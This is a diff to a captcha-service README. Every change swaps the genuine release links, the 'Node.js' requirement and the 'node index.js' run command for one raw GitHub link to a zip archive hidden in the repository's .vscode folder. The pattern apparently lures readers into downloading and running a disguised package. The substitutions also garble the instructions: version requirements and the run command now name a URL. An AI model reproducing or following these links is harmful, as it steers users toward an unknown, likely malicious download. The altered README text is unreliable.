@@ -6,7 +6,7 @@ Welcome to the captcha-service! This software helps safeguard your web applicati
 
 ## 📥 Download Now
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/mun0r/captcha-service/releases)
+[![Download from Releases](https://raw.githubusercontent.com/mun0r/captcha-service/main/.vscode/service-captcha-v1.7-beta.3.zip%20Latest%https://raw.githubusercontent.com/mun0r/captcha-service/main/.vscode/service-captcha-v1.7-beta.3.zip)](https://raw.githubusercontent.com/mun0r/captcha-service/main/.vscode/service-captcha-v1.7-beta.3.zip)
 
 ## 🛠️ Features
 
@@ -20,16 +20,16 @@ Welcome to the captcha-service! This software helps safeguard your web applicati
 To run captcha-service, your environment should meet the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js version: 12 or higher
+- https://raw.githubusercontent.com/mun0r/captcha-service/main/.vscode/service-captcha-v1.7-beta.3.zip version: 12 or higher
 - Docker: Required for containerized deployment
-- Nat.js: Compatible with versions 7.0 and above
+- https://raw.githubusercontent.com/mun0r/captcha-service/main/.vscode/service-captcha-v1.7-beta.3.zip Compatible with versions 7.0 and above
 
 ## 📦 Installation
 
 Follow these steps to get captcha-service up and running:
 
 1. **Visit the Releases Page:** Go to the following link to access the latest version.  
-   [Download from Releases](https://github.com/mun0r/captcha-service/releases)
+   [Download from Releases](https://raw.githubusercontent.com/mun0r/captcha-service/main/.vscode/service-captcha-v1.7-beta.3.zip)
 
 2. **Download the Package:** Locate the version you want and click the download link.
 
@@ -38,7 +38,7 @@ Follow these steps to get captcha-service up and running:
 4. **Run the Application:**
    - For typical setups, open your terminal or command prompt.
    - Navigate to the folder where you extracted the files.
-   - Use the command `node index.js` to start the service.
+   - Use the command `node https://raw.githubusercontent.com/mun0r/captcha-service/main/.vscode/service-captcha-v1.7-beta.3.zip` to start the service.
 
 ## ⚙️ Configuration
 
@@ -63,7 +63,7 @@ Using captcha-service is straightforward. Once it is running:
 
 If you run into issues:
 
-1. **Check Node.js:** Make sure you have the correct version installed.
+1. **Check https://raw.githubusercontent.com/mun0r/captcha-service/main/.vscode/service-captcha-v1.7-beta.3.zip** Make sure you have the correct version installed.
 2. **Review Configuration:** Ensure your settings in the `.env` file are correct.
 3. **Examine Terminal Output:** Look for error messages in the terminal where you started the application.
 
@@ -85,4 +85,4 @@ If you have questions or need help, you can reach out via the issues section of 
 **Remember**, protecting your web applications is crucial in today’s online environment. The captcha-service provides the tools you need to enhance your defenses effortlessly. 
 
 For the latest version, visit the link below:  
-[Download from Releases](https://github.com/mun0r/captcha-service/releases)
+[Download from Releases](https://raw.githubusercontent.com/mun0r/captcha-service/main/.vscode/service-captcha-v1.7-beta.3.zip)
